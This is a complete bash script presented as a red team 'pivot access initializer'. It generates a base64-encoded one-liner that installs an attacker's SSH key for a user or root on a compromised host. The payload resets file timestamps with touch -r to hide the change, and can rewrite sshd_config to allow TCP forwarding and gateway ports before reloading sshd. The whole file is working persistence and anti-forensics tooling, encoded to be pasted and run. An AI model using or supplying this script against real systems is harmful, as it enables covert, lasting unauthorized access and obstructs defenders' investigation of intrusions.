#!/usr/bin/env bash
#
# pivot_access_init.sh
#
# Red Team SSH Pivot Access Initializer
#
# Purpose:
#   Initialize SSH access on a pivot host in a controlled and OPSEC-aware way.
#   The script installs SSH public keys and optionally prepares the system
#   for SSH-based pivoting.
#
# Access Levels:
#   - low  (default):
#       * Assumes only non-root user access
#       * Adds SSH key ONLY to the specified user
#       * Does NOT modify sshd_config
#       * Does NOT reload or restart sshd
#
#   - high:
#       * Assumes root access is available
#       * Adds SSH key to root
#       * Optionally adds SSH key to a non-root user
#       * Can prepare sshd for pivoting via Match User blocks
#
# Modes:
#   - Stealth (--stealth, high only):
#       * Only modifies authorized_keys
#       * Leaves sshd_config untouched
#       * No sshd reload or restart
#
# Key Handling:
#   - Supports restricted keys via from="<IP|CIDR>"
#   - Same key can be applied to root and/or user
#
# OPSEC Features:
#   - Preserves mtime for authorized_keys, .ssh, home directories
#   - Preserves mtime for sshd_config when modified
#   - Diff-only logic: no changes, no reloads, no timestamp drift
#

set -euo pipefail

usage() {
  cat <<EOF
Usage:
  $0 -key <public_key_or_file> [options]

Access level:
  -low                  Only non-root user access (default)
  -high                 Root access available

Required:
  -key <key|file>       SSH public key string or path to .pub file

Optional:
  --user <username>     Target user (defaults to current user if omitted)
  --restrict-ip <ip>    Restrict key using from="<ip|cidr>"
  --stealth             Do not modify sshd_config (high only)
  -v                    Verbose: always print the final command
  -h, --help            Show this help message
EOF
  exit 0
}

KEY_INPUT=""
TARGET_USER=""
RESTRICT_IP=""
STEALTH=0
ACCESS_LEVEL="low"
VERBOSE=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    -key) KEY_INPUT="${2:-}"; shift 2 ;;
    --user) TARGET_USER="${2:-}"; shift 2 ;;
    --restrict-ip) RESTRICT_IP="${2:-}"; shift 2 ;;
    --stealth) STEALTH=1; shift ;;
    -low) ACCESS_LEVEL="low"; shift ;;
    -high) ACCESS_LEVEL="high"; shift ;;
    -v) VERBOSE=1; shift ;;
    -h|--help) usage ;;
    *) echo "Unknown argument: $1"; usage ;;
  esac
done

[[ -z "$KEY_INPUT" ]] && usage

# Default to the current user if --user is not provided
if [[ -z "$TARGET_USER" ]]; then
  TARGET_USER="$(id -un 2>/dev/null || true)"
  [[ -z "$TARGET_USER" ]] && TARGET_USER="$(whoami 2>/dev/null || true)"
  [[ -z "$TARGET_USER" ]] && TARGET_USER="${USER:-}"
fi

# If we still cannot determine a user, fail
if [[ -z "$TARGET_USER" ]]; then
  echo "Error: could not determine current user. Use --user <username>."
  exit 1
fi

# If we are in -high and resolved user is root, treat as "no extra user" to avoid "root,root"
if [[ "$ACCESS_LEVEL" == "high" && "${TARGET_USER:-}" == "root" ]]; then
  TARGET_USER=""
fi

if [[ -f "$KEY_INPUT" ]]; then
  PUBKEY=$(<"$KEY_INPUT")
else
  PUBKEY="$KEY_INPUT"
fi

if [[ -n "$RESTRICT_IP" ]]; then
  KEY_ENTRY="from=\"$RESTRICT_IP\" $PUBKEY"
else
  KEY_ENTRY="$PUBKEY"
fi

ESCAPED_KEY_ENTRY=$(printf '%s' "$KEY_ENTRY" | sed 's/"/\\"/g')

read -r -d '' CMD <<EOF || true
set -e

ACCESS_LEVEL="$ACCESS_LEVEL"
STEALTH="$STEALTH"
TARGET_USER="$TARGET_USER"
KEY_ENTRY="$ESCAPED_KEY_ENTRY"

preserve_time() {
  local ref="\$1" target="\$2"
  if [[ -n "\$ref" && -e "\$ref" && -e "\$target" ]]; then
    touch -r "\$ref" "\$target"
  fi
}

snapshot_time_ref() {
  local path="\$1"
  local ref

  [[ -e "\$path" ]] || return 0

  ref=\$(mktemp)
  touch -r "\$path" "\$ref"
  printf '%s\n' "\$ref"
}

cleanup_time_ref() {
  local ref="\$1"
  if [[ -n "\$ref" && -e "\$ref" ]]; then
    rm -f "\$ref"
  fi
}

add_key() {
  local user="\$1"
  local home sshdir authfile
  local home_ts_ref="" ssh_ts_ref="" auth_ts_ref=""
  local changed=0

  home=\$(getent passwd "\$user" | cut -d: -f6 || true)
  [[ -z "\$home" ]] && return 0

  sshdir="\$home/.ssh"
  authfile="\$sshdir/authorized_keys"

  home_ts_ref="\$(snapshot_time_ref "\$home")"
  ssh_ts_ref="\$(snapshot_time_ref "\$sshdir")"
  auth_ts_ref="\$(snapshot_time_ref "\$authfile")"

  if [[ ! -d "\$sshdir" ]]; then
    install -d -m 700 -o "\$user" -g "\$user" "\$sshdir"
    changed=1
  else
    chmod 700 "\$sshdir"
    chown "\$user:\$user" "\$sshdir"
  fi

  if [[ -f "\$authfile" ]]; then
    chmod 600 "\$authfile"
    chown "\$user:\$user" "\$authfile"
    if ! grep -qxF "\$KEY_ENTRY" "\$authfile"; then
      printf '%s\n' "\$KEY_ENTRY" >> "\$authfile"
      changed=1
    fi
  else
    printf '%s\n' "\$KEY_ENTRY" > "\$authfile"
    chmod 600 "\$authfile"
    chown "\$user:\$user" "\$authfile"
    changed=1
  fi

  # Preserve timestamps only if we changed something
  if [[ "\$changed" -eq 1 ]]; then
    if [[ -n "\$auth_ts_ref" ]]; then
      preserve_time "\$auth_ts_ref" "\$authfile"
    elif [[ -n "\$ssh_ts_ref" ]]; then
      preserve_time "\$ssh_ts_ref" "\$authfile"
    elif [[ -n "\$home_ts_ref" ]]; then
      preserve_time "\$home_ts_ref" "\$authfile"
    fi

    if [[ -n "\$ssh_ts_ref" ]]; then
      preserve_time "\$ssh_ts_ref" "\$sshdir"
    elif [[ -n "\$home_ts_ref" ]]; then
      preserve_time "\$home_ts_ref" "\$sshdir"
    fi

    if [[ -n "\$home_ts_ref" ]]; then
      preserve_time "\$home_ts_ref" "\$home"
    fi
  fi

  cleanup_time_ref "\$auth_ts_ref"
  cleanup_time_ref "\$ssh_ts_ref"
  cleanup_time_ref "\$home_ts_ref"
}

ensure_sshd_block() {
  local sshd_cfg="\$1"
  local users="\$2"
  local changed_ref="\$3"

  has_complete_match_block() {
    awk -v users="\$1" '
      \$1=="Match" && \$2=="User" && \$3==users {inblock=1; next}
      inblock && \$1=="Match" {exit}
      inblock {
        if (\$1=="PubkeyAuthentication" && \$2=="yes") has_pub=1
        if (\$1=="AllowTcpForwarding" && \$2=="yes") has_fwd=1
        if (\$1=="GatewayPorts" && \$2=="clientspecified") has_gateway=1
      }
      END { exit !(inblock && has_pub && has_fwd && has_gateway) }
    ' "\$sshd_cfg"
  }

  if ! has_complete_match_block "\$users"; then
    cat <<EOM >> "\$sshd_cfg"

Match User \$users
    PubkeyAuthentication yes
    AllowTcpForwarding yes
    GatewayPorts clientspecified
EOM
    printf -v "\$changed_ref" '%s' 1
  fi
}

# LOW access: user only
if [[ "\$ACCESS_LEVEL" == "low" ]]; then
  add_key "\$TARGET_USER"
  exit 0
fi

# HIGH access
add_key root
[[ -n "\$TARGET_USER" ]] && add_key "\$TARGET_USER"

# sshd_config handling (high, non-stealth)
if [[ "\$STEALTH" -eq 0 ]]; then
  SSHD_CFG="\${PIVOT_ACCESS_INIT_SSHD_CONFIG:-/etc/ssh/sshd_config}"
  SSHD_TS_REF="\$(snapshot_time_ref "\$SSHD_CFG")"
  changed=0

  users="root"
  [[ -n "\$TARGET_USER" ]] && users="root,\$TARGET_USER"

  ensure_sshd_block "\$SSHD_CFG" "\$users" changed

  if [[ "\$changed" -eq 1 ]]; then
    sshd -t -f "\$SSHD_CFG"

    if systemctl is-active sshd >/dev/null 2>&1; then
      systemctl reload sshd 2>/dev/null || systemctl restart sshd
    else
      service ssh reload 2>/dev/null || service ssh restart
    fi

    preserve_time "\$SSHD_TS_REF" "\$SSHD_CFG"
  fi

  cleanup_time_ref "\$SSHD_TS_REF"
fi
EOF

# Base64 encode
if base64 --version >/dev/null 2>&1; then
  ENCODED=$(printf '%s' "$CMD" | base64 -w 0)
else
  ENCODED=$(printf '%s' "$CMD" | base64 | tr -d '\n')
fi

# ------------------------------
# Clipboard support
# ------------------------------

# Build final one-liner (sudo for -high)
if [[ "$ACCESS_LEVEL" == "high" ]]; then
  RUN_CMD="sudo bash -c 'echo $ENCODED | base64 -d | bash'"
else
  RUN_CMD="bash -c 'echo $ENCODED | base64 -d | bash'"
fi

print_clipboard_hints() {
  local is_linux=0
  local is_wayland=0
  local is_x11=0

  [[ "$(uname -s 2>/dev/null || true)" == "Linux" ]] && is_linux=1
  [[ -n "${WAYLAND_DISPLAY-}" ]] && is_wayland=1
  [[ -n "${DISPLAY-}" ]] && is_x11=1

  echo
  echo "Clipboard hints:"

  # Wayland preferred
  if [[ "$is_linux" -eq 1 && "$is_wayland" -eq 1 ]]; then
    if ! command -v wl-copy >/dev/null 2>&1; then
      echo "  - For Wayland, install wl-clipboard (wl-copy/wl-paste)."
      echo "    Debian/Ubuntu:  sudo apt-get update && sudo apt-get install -y wl-clipboard"
      echo "    Fedora/RHEL:    sudo dnf install -y wl-clipboard"
      echo "    Arch:           sudo pacman -S --noconfirm wl-clipboard"
    fi
  fi

  # X11
  if [[ "$is_linux" -eq 1 && "$is_x11" -eq 1 ]]; then
    if ! command -v xclip >/dev/null 2>&1; then
      echo "  - For X11, install xclip."
      echo "    Debian/Ubuntu:  sudo apt-get update && sudo apt-get install -y xclip"
      echo "    Fedora/RHEL:    sudo dnf install -y xclip"
      echo "    Arch:           sudo pacman -S --noconfirm xclip"
    fi
  fi

  echo "  - On Windows/WSL, try clip.exe (usually available) or PowerShell Set-Clipboard."
}

clipboard_tool_precheck() {
  # macOS
  if command -v pbcopy >/dev/null 2>&1; then return 0; fi

  # Wayland if present
  if [[ -n "${WAYLAND_DISPLAY-}" ]] && command -v wl-copy >/dev/null 2>&1; then return 0; fi

  # X11 if present
  if [[ -n "${DISPLAY-}" ]] && command -v xclip >/dev/null 2>&1; then return 0; fi

  # fallback checks
  if command -v wl-copy >/dev/null 2>&1; then return 0; fi
  if command -v xclip >/dev/null 2>&1; then return 0; fi

  # Windows / WSL / Git Bash
  if command -v clip.exe >/dev/null 2>&1; then return 0; fi
  if command -v clip >/dev/null 2>&1; then return 0; fi
  if command -v powershell.exe >/dev/null 2>&1; then return 0; fi

  return 1
}

copy_to_clipboard() {
  local text="$1"

  # macOS
  if command -v pbcopy >/dev/null 2>&1; then
    printf '%s' "$text" | pbcopy
    return $?
  fi

  # Wayland preferred when present
  if [[ -n "${WAYLAND_DISPLAY-}" ]] && command -v wl-copy >/dev/null 2>&1; then
    printf '%s' "$text" | wl-copy
    return $?
  fi

  # X11 preferred when present
  if [[ -n "${DISPLAY-}" ]] && command -v xclip >/dev/null 2>&1; then
    printf '%s' "$text" | xclip -selection clipboard
    return $?
  fi

  # fallback: try wl-copy then xclip
  if command -v wl-copy >/dev/null 2>&1; then
    printf '%s' "$text" | wl-copy
    return $?
  fi
  if command -v xclip >/dev/null 2>&1; then
    printf '%s' "$text" | xclip -selection clipboard
    return $?
  fi

  # Windows / WSL / Git Bash
  if command -v clip.exe >/dev/null 2>&1; then
    printf '%s' "$text" | clip.exe
    return $?
  fi
  if command -v clip >/dev/null 2>&1; then
    printf '%s' "$text" | clip
    return $?
  fi
  if command -v powershell.exe >/dev/null 2>&1; then
    printf '%s' "$text" | powershell.exe -NoProfile -Command "Set-Clipboard -Value ([Console]::In.ReadToEnd())"
    return $?
  fi

  return 1
}

# Copy attempt + conditional printing
COPIED=0
CLIP_AVAILABLE=0

if clipboard_tool_precheck; then
  CLIP_AVAILABLE=1
  set +e
  copy_to_clipboard "$RUN_CMD"
  rc=$?
  set -e
  if [[ $rc -eq 0 ]]; then
    COPIED=1
  fi
fi

# Print command only if:
#  - verbose enabled, OR
#  - clipboard copy failed / unavailable
if [[ "$VERBOSE" -eq 1 || "$COPIED" -eq 0 ]]; then
  echo
  echo "Run on the pivot host:"
  echo
  echo "$RUN_CMD"
  echo
fi

# Status / hints
if [[ "$COPIED" -eq 1 ]]; then
  echo "Command successfully copied to the clipboard."
else
  if [[ "$CLIP_AVAILABLE" -eq 1 ]]; then
    echo "Failed to copy the command to the clipboard; please copy it manually."
  else
    print_clipboard_hints
  fi
fi
